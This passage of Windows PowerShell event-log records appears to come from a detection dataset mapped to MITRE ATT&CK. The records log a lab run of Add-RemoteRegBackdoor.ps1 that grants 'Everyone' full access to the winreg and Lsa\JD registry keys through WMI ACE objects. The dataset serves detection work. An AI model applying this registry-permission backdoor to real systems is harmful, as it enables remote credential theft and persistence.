registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1028,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Creating the trustee WMI object with user 'Everyone'\"", ""}]}}"
75,68909,2021-12-09 19:54:03.4357365,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1030,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1030,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Trustee"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1030,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\"", ""}]}}"
76,68910,2021-12-09 19:54:03.4357365,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1032,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1032,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Applying Trustee to new Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1032,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Applying Trustee to new Ace\"", ""}]}}"
77,68911,2021-12-09 19:54:03.4513712,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1034,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1034,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1034,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Calling SetSecurityDescriptor on the key with the newly created Ace\"", ""}]}}"
78,68912,2021-12-09 19:54:03.4531671,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1036,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1036,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring completed for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1036,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg] Backdooring completed for key\"", ""}]}}"
79,68913,2021-12-09 19:54:03.4531671,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1038,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1038,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Backdooring started for key"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1038,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Backdooring started for key\"", ""}]}}"
80,68914,2021-12-09 19:54:03.4531671,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1040,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1040,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1040,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating ACE with Access Mask of 983103 (ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)\"", ""}]}}"
81,68915,2021-12-09 19:54:03.4531671,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1042,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1042,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1042,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Ace\"", ""}]}}"
82,68916,2021-12-09 19:54:03.4688027,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1044,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1044,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Creating the trustee WMI object with user 'Everyone'"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1044,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Creating the trustee WMI object with user 'Everyone'\"", ""}]}}"
83,68917,2021-12-09 19:54:03.4688027,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1046,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: New-Object,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1046,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(New-Object): ""New-Object"", ParameterBinding(New-Object): name=""TypeName""; value=""System.Management.ManagementClass"", ParameterBinding(New-Object): name=""ArgumentList""; value=""win32_Trustee"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = New-Object,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1046,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(New-Object): \""New-Object\"", ParameterBinding(New-Object): name=\""TypeName\""; value=\""System.Management.ManagementClass\"", ParameterBinding(New-Object): name=\""ArgumentList\""; value=\""win32_Trustee\"", ""}]}}"
84,68918,2021-12-09 19:54:03.4688027,4103,Info,Microsoft-Windows-PowerShell,Microsoft-Windows-PowerShell/Operational,4960,2608,fs03vuln.offsec.lan,2,S-1-5-21-4230534742-2542757381-3142984815-1234,Pipeline executed,"        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1048,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",,Command Name: Write-Verbose,Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,Script Name: C:\TOOLS\Add-RemoteRegBackdoor.ps1,"ConnectedUser:         Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\TOOLS\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1048,         User = OFFSEC\hack1,         Shell ID = Microsoft.PowerShell, ",Host Name: ConsoleHost,"Payload: CommandInvocation(Write-Verbose): ""Write-Verbose"", ParameterBinding(Write-Verbose): name=""Message""; value=""[FS03 : SYSTEM\CurrentControlSet\Control\Lsa\JD] Applying Trustee to new Ace"", ",,False,EVTX-to-MITRE-Attack\TA0005-Defense Evasion\T1112-Modify registry\ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,0x0,0,"{""EventData"":{""Data"":[{""@Name"":""ContextInfo"",""#text"":""        Severity = Informational,         Host Name = ConsoleHost,         Host Version = 4.0,         Host ID = a991c134-2e90-418c-940d-258271dd1e9c,         Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,         Engine Version = 4.0,         Runspace ID = 4315d698-493e-410a-8e70-1c07123fdca4,         Pipeline ID = 88,         Command Name = Write-Verbose,         Command Type = Cmdlet,         Script Name = C:\\TOOLS\\Add-RemoteRegBackdoor.ps1,         Command Path = ,         Sequence Number = 1048,         User = OFFSEC\\hack1,         Shell ID = Microsoft.PowerShell, ""},{""@Name"":""UserData""},{""@Name"":""Payload"",""#text"":""CommandInvocation(Write-Verbose): \""Write-Verbose\"", ParameterBinding(Write-Verbose): name=\""Message\""; value=\""[FS03 : SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD] Applying Trustee to new 